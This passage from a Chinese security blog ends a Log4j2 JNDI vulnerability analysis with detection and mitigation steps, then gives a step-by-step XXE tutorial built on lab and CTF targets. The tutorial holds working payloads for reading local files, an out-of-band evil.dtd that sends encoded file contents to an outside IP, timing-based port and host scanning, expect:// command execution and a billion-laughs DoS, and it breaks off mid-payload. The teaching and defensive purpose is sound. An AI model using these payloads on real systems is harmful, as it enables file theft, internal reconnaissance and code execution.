经过一段的嵌套调用，来到Interpolator.lookup，这里会通过var.indexOf(PREFIX_SEPARATOR)判断\":\"之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示 那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示 然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示 说到这里，我们已经详细了解了logger.error()造成RCE的原理： 前提是`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。 而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。 而偏偏是jndi引起漏洞的原因为： 在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 ${java:...} 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。 那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值intLevel记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示： 当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小 跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示 而这里日志优先级数值小于等于200的就只有\"error\"、“fatal”，这两个，所以logger.fatal()方法也可触发漏洞。但是\"warn\"、\"info\"等大于200的就触发不了了。 但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;Configuration status=\"WARN\"&gt; &lt;Appenders&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\"&gt; &lt;PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=\"error\"&gt; &lt;AppenderRef ref=\"Console\"/&gt; &lt;/Root&gt; &lt;/Loggers&gt; &lt;/Configuration&gt; 所以只需要做一点简单的修改，将&lt;Root level=\"error\"&gt;中的error改成一个优先级比较低的，例如\"info\"这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;Configuration status=\"WARN\"&gt; &lt;Appenders&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\"&gt; &lt;PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=\"info\"&gt; &lt;AppenderRef ref=\"Console\"/&gt; &lt;/Root&gt; &lt;/Loggers&gt; &lt;/Configuration&gt; 关于Jndi部分的远程类加载利用可以参考实验室往常的文章：Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解、JAVA JNDI注入知识详解 0x08 入侵排查 1. 日志排查 攻击者在利用前通常采用dnslog方式进行扫描探测，对于常见利用方式可通过应用系统报错日志中对以下关键字进行排查。 \"javax.naming.CommunicationException\" \"javax.naming.NamingException: problem generating object using object factory\" \"Error looking up JNDI resource\" 2. 流量排查 排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字}。 排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 0x09 漏洞修复 排查应用是否引入了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。尽快升级Apache Log4j2所有相关应用到最新的版本：https://github.com/apache/logging-log4j2 缓解措施： 添加 jvm 启动参数 -Dlog4j2.formatMsgNoLookups=true 在应⽤程序的 classpath 下添加 log4j2.component.properties 配置⽂件⽂件， ⽂件内容：log4j2.formatMsgNoLookups=True 移除 log4j-core 包中 JndiLookup 类⽂件并重启服务 各大厂商针对log4j2漏洞应急方案集合：https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g 参考文章 前置基础知识参考：https://blog.csdn.net/qq_43531669/article/details/123562530 复现过程参考1：http://www.luckysec.cn/posts/e991b2d2.html#toc-heading-5 复现过程参考2：https://blog.csdn.net/weixin_55843787/article/details/124707658?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2漏洞复现-vulfocus&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124707658.142^v91^insertT0,239^v12^insert_chatgpt&amp;spm=1018.2226.3001.4187 复现过程参考3：https://paper.seebug.org/1789/#0x05 绕过方法参考：https://www.freebuf.com/articles/network/316590.html","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"浅析xxe漏洞","path":"/2023/07/29/qian-xi-xxe-lou-dong/","content":"一、XML简介 XML，即Extensible Markdown Language，可扩展标记语言的缩写。XML是一种允许用户对自己的标记语言进行定义的源语言，可以用于标记数据，定义数据类型。XML是标准通用标记语言，具有可扩展性好、内容与形式分离、语法要求严格、保值性好等优点。 XML与HTML非常相似，但是XML的设计宗旨是用于传输数据，而HTML的设计宗旨是用于展示数据。XML的标签没有被预定义，因此我们可以自己定义标签。 二、XML语法规则 接下来，我们来讲解XML语法规则。 （一）XML基本语法 一个典型的XML文档如下所示： &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;person&gt; &lt;name&gt;Bob&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;address&gt;1-1-110&lt;/address&gt; &lt;country&gt;China&lt;/country&gt; &lt;major&gt;History&lt;/major&gt; &lt;/person&gt; 在上述文档中，第一行是XML文档的头部声明，指明了XML文档的版本号和编码。XML对于头部声明并不严格要求，可有可无，但是一般最好写上头部声明。 在XML文档中，必须存在一个根节点，根节点是其他所有节点的父节点，在上述文档中，根节点是person。在XML中，所有的标签必须成对出现，标签名区分大小写并且标签不能交叉。但是标签名称可以自行定义。 （二）XML注释 XML文档中可以使用注释，注释的使用格式如下所示： &lt;!--This is annotation--&gt; （三）XML属性 XML支持在标签元素中定义属性，写法类似于HTML，示例如下所示： &lt;name len=\"3\"&gt;Bob&lt;/name&gt; XML规定，一个标签可以有多个属性，但是属性的值必须使用引号括起来。 （四）XML特殊字符处理 XML如果想表达特殊字符，有两种方法。 第一种方法是使用转义字符，常用的转义字符如下表所示： 第二种方式是使用CDATA区域，CDATA区域定义如下所示： &lt;![CDATA[【CDATA区域内容】]]&gt; XML规定，对CDATA区域内的所有特殊字符不进行解析。 三、XML文档结构 XML文档结构包括XML声明、DTD类型定义（可选）、文档元素，同时XXE漏洞和DTD文档相关，所以这里主要对DTD进行介绍。 &lt;!--XML申明--&gt; &lt;?xml version=\"1.0\"?&gt; &lt;!--文档类型定义--&gt; &lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,head,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt; 上面这个 DTD 就定义了 XML 的根元素是 note，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写 &lt;!--文档元素--&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; 四、DTD介绍 文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。 内部文档声名DTD:&lt;!DOCTYPE 根元素 [元素声明]&gt; 外部文档声明DTD:&lt;!DOCTYPE 根元素 SYSTEM \"文件名\"&gt; DTD文档中有很多重要的关键字如下： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了标签以外，还需要有些内容是固定的 实例： &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe \"test\" &gt;]&gt; 这里定义元素为 ANY ，意思是可以接收任何元素，接着定义了一个XML实体，这个实体我们可以看做一个变量，在后续我们可以通过 &amp; 符号进行引用，那么后续的XML应该这样写 &lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt; &lt;/creds&gt; 我们通过 &amp;xxe 对上述定义的实体xxe进行引用，到时候输出结果就会将其替换为test。 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 1.1 内部实体声明 内部声明采用如下格式定义： &lt;!ENTITY 实体名 \"实体值\"&gt; 声明之后就可以通过“&amp;实体名;”来获取，示例如下 &lt;!DOCTYPE foo [&lt;!ENTITY test \"john\"&gt;]&gt; &lt;foo&gt; &lt;name&gt;&amp;test;&lt;/name&gt; &lt;/foo&gt; 1.2 外部实体声明 XXE 的产生正是外部实体引用的结果，可分为通用实体和参数实体。 （1）通用实体声明格式如下： &lt;!ENTITY 实体名 SYSTEM \"URI\"&gt; 或者 &lt;!ENTITY 实体名 PUBLIC \"public_ID\" \"URI\"&gt; //引用公用DTD文件 举个例子： &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; 声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。 （2）参数实体声明主要用于后续使用，与通用实体不同的是，它中间有百分号字符（%），其声明格式 如下： &lt;!ENTITY % 实体名称 \"实体的值\"&gt; 或者 &lt;!ENTITY % 实体名称 SYSTEM \"URI\"&gt; 注意： (1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用%实体名;引用 (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3)和通用实体一样，参数实体也可以外部引用 实例： &lt;!ENTITY % an-element \"&lt;!ELEMENT mytag (subtag)&gt;\"&gt; &lt;!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"&gt; %an-element; %remote-dtd; 参数实体在我们 Blind XXE 中起到了至关重要的作用 1.3 外部实体 由于XXE漏洞主要是利用引入外部实体，而导致的漏洞，所以这里主要了解外部实体。而外部实体又分为很多的类型。这里面的类型一些是在之前比如文件包含等中提到的一些协议，以及未提及到的协议。 外部实体在DTD中使用 &lt;!ENTITY 实体名称 SYSTEM \"URI\"&gt; 根据程序不同，能够引入的实体也是不同的，例如： 上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有 外部实体演示： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt; &lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; 五、XXE漏洞基本介绍 1.1 XXE漏洞基本概念 XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞。 XML就是传输和存储数据的一个类型。 XXE就是xml的漏洞注入的全称。 1.2 XXE漏洞危害 XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 1.3 XXE漏洞输出形式 XXE漏洞的输出显示分为：有回显、无回显。 有回显就能够配合协议以及外部引入进行攻击。 无回显就需要配合外部引入-反向链接配合。 1.4 XXE漏洞相关差异 XML和HTML的差异 XML被设计为数据传输和存储数据，其焦点是数据的内容。 HTML被设计用来显示数据，其焦点是数据的外观。 HTML指在显示信息，而XML指在传输数据。 六、XXE漏洞检测 第一步检测XML是否会被成功解析： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name \"my name is nMask\"&gt;]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; 如果页面输出了my name is nMask，说明xml文件可以被解析。 第二步检测服务器是否支持DTD引用外部实体： &lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM \"http://localhost/index.html\"&gt; %name; ]&gt; 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.xml的请求。 如果支持引用外部实体，那么很有可能是存在xxe漏洞的。 七、XXE漏洞测试 在测试中所有的语句基本上的固定格式，也就是说构建的payload基本上只需要修改调用协议，以及相关的参加即可，其它的格式，都是固定的可以直接使用。 这里由于某些工具没咋见过，我就先弄php的xxe吧 1.1.有回显测试 像之前提到的，如果有回显，那么就可以配合更多的协议或外部引入进行利用。那么这里就先简单测试一下有回显状态。 1.1.1.有回显案例 这里我们使用xxe-labs靶场。下载链接：https://github.com/c0ny1/xxe-lab 测试回显位置 通过测试，能够看到在admin位置是存在回显的，而后面的password位置的1234是没回显的。 构建payload 构建payload后，也是成功的读取到了文件。 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY name SYSTEM \"file:///c://windows/win.ini\"&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 1.1.2.特殊符号读取 我们可以看到上述读取到的内容正常回显，那如果我们读取一下文件的内容会如何呢？ # /etc/fstab: static file system information. # # &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt; proc /proc proc defaults 0 0 /dev/hda2 / ext3 defaults,errors=remount-ro 0 1 ... 我们会发现页面报错无法正常读取，究其原因是该文件中含有特殊字符： 引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,\",'等。这些均需要对其进行转义，否则会对XML解释器生成错误) 对于这种情况我们就需要使用 CDATA 来进行绕过： 有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者\" 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记 &lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt; 可以输入任意字符除了 ]]&gt; 不能嵌套 用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来 那我们需要想办法在引用的两边加上 \"”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY start \"&lt;![CDATA[\"&gt; &lt;!ENTITY goodies SYSTEM \"file:///d:/test.txt\"&gt; &lt;!ENTITY end \"]]&gt;\"&gt; &lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt; 可以看到依旧报错，说明我们不能在xml中进行拼接，应该先拼接好以后再在xml中调用（也就是首先在DTD中拼接好），那这种情况就需要利用参数实体了 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % goodies SYSTEM \"file:///d:/test.txt\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; 可以看到正常读取 1.2.无回显测试 参考：https://xz.aliyun.com/t/3357#toc-0 无回显的情况又称为blind xxe可以使用外带数据通道提取数据。而且在正常的环境下，服务器端通常都会把回显取消。因此我们解决该问题最好的办法就是使用外带的方式。 1.2.1.无回显常规测试案例 1.2.1.1.关闭报错及输出 这里我们先把XXElabs靶场的输出及报错都关闭，模拟无回显情况。在账号上面添加一个error_reporting(0);，然后在下面的echo $result;前面添加一个//，即可模拟成功。 1.2.1.2.抓包测试 这里我们首先抓包进行测试，可以发现不在出现报错，以及原来显示的位置也不在显示。 1.2.1.3.构建payload 这里需要在外部搭建一台vps，无回显需要查看服务器的访问日志，当存在访问日志了，那么就可以证明是支持外部实体的，若不存在日志，则证明不支持外部实体，或者被WAF拦截。 payload： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % shit SYSTEM \"http://192.168.10.50/1.txt\"&gt; %shit; ]&gt; 1.2.1.4.查看服务器日志 这里去攻击者服务器上查看一下日志，可以看到在服务器的访问日志中，查看到是存在一条访问日志的，那么就可以证明是支持外部实体的。 1.2.2.无回显DNSlog测试案例 上面的常规测试是需要我们自己搭建一个vps来进行测试，那么如果在刚开始测试的时候，不方便把自己的服务器地址暴露出来怎么办？ 1.2.2.1.DNSlog方式 通过DNSlog方式看服务器是否有DNS或者HTTP的请求。但是由于不确定因素以及处于安全角度来考虑使用外部的DNSlog不安全，那么可以使用burp中自带的有官方架设的默认公共服务器上的DNSlog服务器。 DNSlog位置： 点击copy to clipboard后(这一步就是复制了子域名)，随后粘贴子域名即可。当请求时就会在下面的窗口中显示相关的请求信息。同时这个窗口不能关闭，若关闭了，那么就会销毁相关的信息。 1.2.2.2.构建payload 其实这里的payload和之前的payload基本一致。这里需要注意的是，我们复制的子域名是没有http://的需要我们自己添加上去。所以修改下面的payload的时候只需要把http://后面的内容替换即可，设置好后，点击发送。 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://3nrivqeathjejd5mau53iamdk4qveq2f.oastify.com\"&gt; %d; ]&gt; 1.2.2.3.查看效果 发送完成后，点击Poll now(现在调查)，当然也可以在复制子域名后就开始轮询，这边可能需要稍等一会就能显示出来，当看到结果后就可以判断是可以使用外部引入的。 1.3.总结 以上都是简单测试，以及了解相关的payload如何构建，下面才是真实的案例。 八、任意文件读取 所谓的任意文件读取，其实也就是读取受害者服务器中的敏感文件。这里同样分为无回显和有回显操作。这里我们使用xxe-labs靶场做演示。 2.1.有回显案例 2.1.1.抓包 我们在打开靶场后，输入账号和密码后对其进行抓包，然后放到重放器中。当然这里的账号和密码随便输都行。 2.1.2.构建payload 我们通过构建的payload对Windows中的配置文件，进行读取，也是成功读取了。 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///c:/windows/win.ini\" &gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 2.2.无回显案例 2.2.1.修改配置文件 这里为了演示修改，我们把xxelabs中的报错和回显都关闭。 2.2.2.测试是否回显 通过测试发现是，无法回显了，这里需要注意，若你还是存在回显，那么刷新一些页面重新加载一下。 2.2.3.构建payload 准备一台攻击服务器，当然本地的使用虚拟机即可，并且开启服务器的访问日志。在根目录下创建一个evil.dtd文件。 &lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://185.243.241.45/?data=%file;'&gt;\" &gt; %all; //攻击payload： &lt;!DOCTYPE updateProfile [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send; ]&gt; 2.2.4.查看访问日志 这里的查看访问日志，是在攻击者的服务器上查看，不要搞错。可以通过下面的图片看到，我们成功获取到日志。 2.2.5.查看日志内容 由于是base64加密的，所以我们还需要对其进行解密，通过解密可以看到，日志的内容和Windows中的win.ini的内容是一样的。 2.2.6.调用解释 这里需要结合payload进行理解，不然单单看解释有点难理解。 在构建的payload中会发现，可以看到挺难理解的，我们根据构建的payload进行解释一下，首先%dtd去调用vps上的evil.dtd文件，这个有点类似于将evil.dtd文件包含进来的感觉，然后调用evil.dtd文件中的%all，%all再去调用%file，而%file就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到%send 以后(因为实体的值中不能有 %, 所以将其转成html实体16进制编码&amp;#x25；)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，成功解决外带的情况。 2.3.基于报错案例 基于报错的原理和无回显类似，无回显通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。所以和无回显的构造方式几乎只有url出不同，其他地方一模一样。 简答来说，报错就是将返回的数据，本该返回回去，但由于URL地址是错误的，那么就会出现报错，将数据显示在报错中。 参考链接：https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/ 2.3.1.引入服务器文件案例 引入服务器文件的操作和无回显案例基本一致，就是上面提到的解释。 2.3.1.1.修改配置文件 这里为了能够实现报错，需要在配置文件中，将不显示报错内容给注释了。 2.3.1.2.构建payload 首先在攻击者服务器中创建evil.dtd文件，在文件中写入payload，在这个payload中会存在一个alskdnm的地方，原本在无回显中这里会写上服务器的IP地址，但是这里随便写一个不存在的地址，使其能够出现报错。 &lt;!ENTITY % start \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://alskdnm/?data=%file;'&gt;\"&gt; %start; 构建攻击的payload的语句 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM \"http://ip/evil.dtd\"&gt; &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini\"&gt; %remote; %send; ]&gt; &lt;message&gt;1234&lt;/message&gt; 2.3.1.3.测试效果 通过返回的数据包内容，可以看到原本应该出现在服务器日志中的编码的数据，现在在前端中了，而这就是基于报错的原因。 2.3.1.4.编码还原 我们对编码进行还原，查看效果。 2.3.2.通过引入本地文件 关于引入本地文件，通过上面的参考链接中的作者的话，这样可行，但是引入本地链接，我这边没有靶场，不好进行测试，如果感兴趣可以去作者的文章中去了解一些，但是，引入本地文件，必然不是一件容易的事。实现起来不管是引入外部或内部，都挺困难的。当然在黔驴技穷的时候，这也是一个不错的办法。 九、探测端口存活 这里端口探测，经过测试，不管有没有回显，都只能靠响应时间来进行判断，这里如果不好判断，可以优先测试一下正常不会开放的端口，然后查看响应时长，然后再去测试一下，正常会开放的端口，例如：3389、80、443、22、23等端口。然后比较两个响应的时长，通常来说，端口开放了，响应会快一点，而端口未开放则响应会比较慢。 3.1.探测端口案例 这里依旧是使用xxelabs靶场做演示，这里我也不改什么回显不回显的情况了，直接进行测试。 3.1.1.抓包 这里把抓到的包放入重放器中。 3.1.2.构建payload 这里我开放了3389端口以及80端口，未开放22端口以及23端口。我们分别进行测试。 这里有两种payload，一种是直接在回显位置修改，一种是不需要管回显位置的内容，同时这里面输入的IP是内网中你想要测试的IP地址以及后面的端口号。这里我只测试一个payload。 1.payload &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://ip:3389\" &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 2.payload： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://ip:3389\" &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 3.1.3.测试开放端口 这里首先测试3389端口和80端口，注意看右下角的响应时间。 3.1.3.1.测试3389端口 在测试3389端口后，页面的响应时间为2312毫秒。 3.1.3.2.测试80端口 可以看到，我们测试80端口，响应时间为102毫秒。当我们使用第一种payload的时候同时存在回显的话，页面中就会把80端口页面中的信息也显示出来了，这里测试的结果是不是就可以间接性读取内网中其它服务器的敏感文件？ 3.1.4.测试未开放端口 这里测试22端口以及23端口，主要看右下角响应时间，同时你也会发现一个问题。 3.1.4.1.测试22端口 测试22端口后，响应的时间达到了21秒多。 3.1.4.2.测试23端口 其实测试23端口后，发现同样也是21秒多。 3.2.自动化探测端口 3.2.1.抓包并修改 这里还是一样将抓到的包，并添加payload。 3.2.2.发送测试器 将修改好的包发送到测试器中，然后进行爆破。 3.2.3.设置变化内容 首先将所有的自动选择的内容全部清除，然后将设定要变化的端口。 3.2.4.设置载荷 我这里为了测试方便，我就随便输入几个端口，输入端口完成后，点击开始攻击 3.2.5.查看攻击效果 这里首先需要将列中接受响应计数勾上，然后点击接受响应计数，就会自动将最短的响应时长排在前面，这样我们就能够完成自动化测试了，无需手动测试，这里显示有四个时长短的 3.3.总结 从响应的时间对比，其实不难看出，当端口开放的时候就可以响应时间就比较快，而端口未开放的时候响应时间就比较长。 十、探测主机存活 这里的探测主机存活使用payload的以及判断和探测端口是基本上是一样的，只是将后面的端口取消，这里就放一个payload，需要注意哦，这里是基于xxelabs靶场构建的payload的。正常的payload可以看探测端口案例中构建的第二个payload，那个才是正常的。 payload： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://192.168.10.51\" &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 4.1.自动化探测主机存活 这里我就不演示手动测试的了，只演示自动化的。 4.1.1.设置变化内容 这里选中主机的最后一位，设置为变化的内容。 4.1.2.设置载荷 这里由于我就开一台服务器，是185.243.241.45，我们添加45但56与43我都没开启。（离谱的是我没有40这个主机，但却有响应，估计是别人的？） 4.1.3.查看攻击效果 从攻击的效果的响应时长来看，也就45、40的通的，其它都是不通的。 十一、更改Content-Type类型 这里就是解释在xxe的盲猜，在不确定是否能够执行的时候，通过修改Content-Type头，让其能够识别xml的语句，实现漏洞利用。更改Content-Type头类型有：application/xml与text/xml。 5.1.CTF题目案例 CTF-Jarvis-OJ-Web-XXE(CTF题)访问地址 5.1.1.抓包 通过抓包发现该靶场的数据的传输方式是json。 5.1.2.修改类型 这里我们需要将类型修改为xml。 5.1.3.构建payload 这里需要将原先下面输出的内容给删除，然后输入上payload。 payload： &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\" &gt; ]&gt; &lt;x&gt;&amp;b;&lt;/x&gt; 5.1.4.测试效果 这里就可以看到我们成功读取到etc下的passwd内容。 十二、内网探测 和读文件差不多，只不过把URI改成内网机器地址 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY rabbit SYSTEM \"http://127.0.0.1/1.txt\" &gt; ]&gt; &lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt; 十三、RCE XXE漏洞利用技巧：从XML到远程代码执行 这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令： &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"expect://id\" &gt;]&gt; &lt;catalog&gt; &lt;core id=\"test101\"&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt; &lt;/catalog&gt; 响应： {\"error\": \"no results for description uid=0(root) gid=0(root) groups=0(root)... 十四、DOS XXE萌新进阶全攻略 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol \"lol\"&gt; &lt;!ENTITY lol2 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt; &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt; &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt; &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"&gt; &lt;!ENTITY lol6 